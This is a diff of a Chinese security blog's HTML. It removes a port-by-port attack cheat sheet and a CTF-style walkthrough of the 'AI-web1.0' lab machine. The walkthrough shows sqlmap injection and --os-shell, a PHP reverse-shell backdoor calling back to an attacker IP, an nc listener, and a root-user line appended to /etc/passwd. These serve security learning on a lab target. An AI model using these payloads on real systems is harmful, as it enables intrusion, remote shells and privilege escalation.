-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-022037" target="_blank" rel="noopener">163邮箱二次验证饶过缺陷</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-045426" target="_blank" rel="noopener">南方周末邮件服务器任意文件读取漏洞</a></p>
-<h4 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h4><h5 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h5><p>默认端口：53</p>
-<p>攻击方式：</p>
-<p>区域传输漏洞</p>
-<p>见2中的总结</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2014-061403" target="_blank" rel="noopener">全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132048" target="_blank" rel="noopener">团购王某站DNS域传送漏洞</a></p>
-<p><a href="http://drops.wooyun.org/tips/1354" target="_blank" rel="noopener">DNS泛解析与内容投毒</a></p>
-<h5 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h5><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p>
-<p>攻击方式：</p>
-<p>DHCP劫持；</p>
-<p>见2中总结</p>
-<p>案例分享：</p>
-<p><a href="http://www.freebuf.com/articles/network/74995.html" target="_blank" rel="noopener">流氓DHCP服务器内网攻击测试</a></p>
-<h5 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h5><p>默认端口：161</p>
-<p>攻击方式:</p>
-<p>爆破：弱口令</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/409" target="_blank" rel="noopener">snmp弱口令引起的信息泄漏</a></p>
-<p><a href="http://drops.wooyun.org/tips/2106" target="_blank" rel="noopener">基于snmp的反射攻击的理论及其实现</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-081037" target="_blank" rel="noopener">华为某服务器SNMP弱口令</a></p>
-<h4 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h4><h5 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h5><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="noopener">请参考</a></p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-020282" target="_blank" rel="noopener">Apache Hadoop远程命令执行</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2013-022434" target="_blank" rel="noopener">新浪漏洞系列第六弹–大量hadoop应用对外访问</a></p>
-<h5 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h5><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
-<p>默认端口：2181</p>
-<p>攻击方式：</p>
-<p>未授权访问；</p>
-<p>案例分享：</p>
-<p><a href="http://tangscan.com/plugin/17261" target="_blank" rel="noopener">zookeeper未授权访问漏洞</a></p>
-<p>网上关于这方面的案例暂时不多，但是对于大数据逐渐泛滥的今天，这些漏洞未来会在乌云上出现一大波！</p>
-<h5 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h5><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
-<p>默认端口：8069</p>
-<p>攻击方式：</p>
-<p>远程命令执行：</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/68" target="_blank" rel="noopener">当渗透遇到zabbix–小谈zabbix安全</a></p>
-<p><a href="http://www.secpulse.com/archives/2089.html" target="_blank" rel="noopener">Zabbix的前台SQL注射漏洞利用</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2013-025219" target="_blank" rel="noopener">网易zabbix运维不当，导致任意命令执行。(可提权、可内网渗透)</a></p>
-<h5 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h5><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
-<p>默认端口：9200（）、9300（）</p>
-<p>攻击方式：</p>
-<p>未授权访问；</p>
-<p>远程命令执行；</p>
-<p>文件遍历；</p>
-<p>低版本webshell植入；</p>
-<p>案例分享：</p>
-<p><a href="http://www.secpulse.com/archives/5401.html" target="_blank" rel="noopener">ElasticSearch 远程代码执行漏洞</a></p>
-<p><a href="http://www.freebuf.com/tools/38025.html" target="_blank" rel="noopener">elasticsearch 漏洞利用工具</a></p>
-<h5 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h5><p>默认端口：11211</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/papers/865" target="_blank" rel="noopener">Memcache安全配置</a></p>
-<p><a href="https://help.aliyun.com/knowledge_detail/6936805.html" target="_blank" rel="noopener">memcache 未授权访问漏洞</a></p>
-<h5 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h5><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><table>
-<thead>
-<tr>
-<th><strong>端口号</strong></th>
-<th><strong>端口说明</strong></th>
-<th><strong>攻击技巧</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>21/22/69</strong></td>
-<td><strong>ftp/tftp</strong> <strong>：文件传输协议</strong></td>
-<td><strong>爆破</strong> <strong>嗅探</strong> <strong>溢出；后门</strong></td>
-</tr>
-<tr>
-<td><strong>22</strong></td>
-<td><strong>ssh</strong> <strong>：远程连接</strong></td>
-<td><strong>爆破</strong> <strong>OpenSSH</strong> <strong>；28个退格</strong></td>
-</tr>
-<tr>
-<td><strong>23</strong></td>
-<td><strong>telnet</strong>  <strong>：远程连接</strong></td>
-<td><strong>爆破</strong> <strong>嗅探</strong></td>
-</tr>
-<tr>
-<td><strong>25</strong></td>
-<td><strong>smtp</strong> <strong>：邮件服务</strong></td>
-<td><strong>邮件伪造</strong></td>
-</tr>
-<tr>
-<td><strong>53</strong></td>
-<td><strong>DNS</strong> <strong>：域名系统</strong></td>
-<td><strong>DNS区域传输</strong> <strong>0.00DNS劫持DNS缓存投毒DNS欺骗深度利用：利用DNS隧道技术刺透防火墙</strong></td>
-</tr>
-<tr>
-<td><strong>67/68</strong></td>
-<td><strong>dhcp</strong></td>
-<td><strong>劫持</strong> <strong>欺骗</strong></td>
-</tr>
-<tr>
-<td><strong>110</strong></td>
-<td><strong>pop3</strong></td>
-<td><strong>爆破</strong></td>
-</tr>
-<tr>
-<td><strong>139</strong></td>
-<td><strong>samba</strong></td>
-<td><strong>爆破</strong>     <strong>未授权访问  远程代码执行</strong></td>
-</tr>
-<tr>
-<td><strong>143</strong></td>
-<td><strong>imap</strong></td>
-<td><strong>爆破</strong></td>
-</tr>
-<tr>
-<td><strong>161</strong></td>
-<td><strong>snmp</strong></td>
-<td><strong>爆破</strong></td>
-</tr>
-<tr>
-<td><strong>389</strong></td>
-<td><strong>ldap</strong></td>
-<td><strong>注入攻击</strong> <strong>未授权访问</strong></td>
-</tr>
-<tr>
-<td><strong>512/513/514</strong></td>
-<td><strong>linux r</strong></td>
-<td><strong>直接使用</strong> <strong>rlogin</strong></td>
-</tr>
-<tr>
-<td><strong>873</strong></td>
-<td><strong>rsync</strong></td>
-<td><strong>未授权访问</strong></td>
-</tr>
-<tr>
-<td><strong>1080</strong></td>
-<td><strong>socket</strong></td>
-<td><strong>爆破：进行内网渗透</strong></td>
-</tr>
-<tr>
-<td><strong>1352</strong></td>
-<td><strong>lotus</strong></td>
-<td><strong>爆破：弱口令</strong> <strong>信息泄漏：源代码</strong></td>
-</tr>
-<tr>
-<td><strong>1433</strong></td>
-<td><strong>mssql</strong></td>
-<td><strong>爆破：使用系统用户登录</strong> <strong>注入攻击</strong></td>
-</tr>
-<tr>
-<td><strong>1521</strong></td>
-<td><strong>oracle</strong></td>
-<td><strong>爆破：</strong> <strong>TNS</strong>  <strong>注入攻击</strong></td>
-</tr>
-<tr>
-<td><strong>2049</strong></td>
-<td><strong>nfs</strong></td>
-<td><strong>配置不当</strong></td>
-</tr>
-<tr>
-<td><strong>2181</strong></td>
-<td><strong>zookeeper</strong></td>
-<td><strong>未授权访问</strong></td>
-</tr>
-<tr>
-<td><strong>3306</strong></td>
-<td><strong>mysql</strong></td>
-<td><strong>爆破</strong> <strong>拒绝服务</strong> <strong>注入</strong></td>
-</tr>
-<tr>
-<td><strong>3389</strong></td>
-<td><strong>rdp</strong></td>
-<td><strong>爆破</strong> <strong>Shift</strong> <strong>后门</strong></td>
-</tr>
-<tr>
-<td><strong>4848</strong></td>
-<td><strong>glassfish</strong></td>
-<td><strong>爆破：控制台弱口令</strong> <strong>认证绕过</strong></td>
-</tr>
-<tr>
-<td><strong>5000</strong></td>
-<td><strong>sybase/DB2</strong></td>
-<td><strong>爆破</strong> <strong>注入</strong></td>
-</tr>
-<tr>
-<td><strong>5432</strong></td>
-<td><strong>postgresql</strong></td>
-<td><strong>缓冲区溢出</strong> <strong>注入攻击</strong> <strong>爆破：弱口令</strong></td>
-</tr>
-<tr>
-<td><strong>5632</strong></td>
-<td><strong>pcanywhere</strong></td>
-<td><strong>拒绝服务</strong> <strong>代码执行</strong></td>
-</tr>
-<tr>
-<td><strong>5900</strong></td>
-<td><strong>vnc</strong></td>
-<td><strong>爆破：弱口令</strong> <strong>认证绕过</strong></td>
-</tr>
-<tr>
-<td><strong>6379</strong></td>
-<td><strong>redis</strong></td>
-<td><strong>未授权访问</strong> <strong>爆破：弱口令</strong></td>
-</tr>
-<tr>
-<td><strong>7001</strong></td>
-<td><strong>weblogic</strong></td>
-<td><strong>Java</strong> <strong>反序列化</strong> <strong>控制台弱口令</strong> <strong>控制台部署</strong> <strong>webshell</strong></td>
-</tr>
-<tr>
-<td><strong>80/443/8080</strong></td>
-<td><strong>web</strong></td>
-<td><strong>常见</strong> <strong>web</strong> <strong>攻击</strong> <strong>控制台爆破</strong> <strong>对应服务器版本漏洞</strong></td>
-</tr>
-<tr>
-<td><strong>8069</strong></td>
-<td><strong>zabbix</strong></td>
-<td><strong>远程命令执行</strong></td>
-</tr>
-<tr>
-<td><strong>9090</strong></td>
-<td><strong>websphere</strong> <strong>控制台</strong></td>
-<td><strong>爆破：控制台弱口令</strong> <strong>Java</strong> <strong>反序列</strong></td>
-</tr>
-<tr>
-<td><strong>9200/9300</strong></td>
-<td><strong>elasticsearch</strong></td>
-<td><strong>远程代码执行</strong></td>
-</tr>
-<tr>
-<td><strong>11211</strong></td>
-<td><strong>memcacache</strong></td>
-<td><strong>未授权访问</strong></td>
-</tr>
-<tr>
-<td><strong>27017</strong></td>
-<td><strong>mongodb</strong></td>
-<td><strong>爆破</strong> <strong>未授权访问</strong></td>
-</tr>
-</tbody></table>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/12/ai-web1-0-ba-ji-xue-xi/" itemprop="url">AI-web1.0靶机学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T22:37:46+08:00">
-                2020-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
-<pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
-<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
-<pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
-<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
-<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
-<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
-<pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
-<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
-<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
-<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
-<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
-<pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
-<p>继续对目标数据库中的表进行探测</p>
-<pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
-<p>探测字段</p>
-<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
-<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
-<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
-<pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
-<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
-<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
-<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
-<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
-<p>依次选择4:php web server</p>
-<p>​                2:custom location</p>
-<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
-<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
-<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
-<p>我们在shell下载下a.php文件。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
-<p>我们在kali下监听 9966端口。</p>
-<pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
-<p>我们可以发现kali已经成功反弹shell。</p>
-<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
-<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
-<pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p>
-<pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
-<p><strong>完</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3344,7 +2937,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3355,7 +2948,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
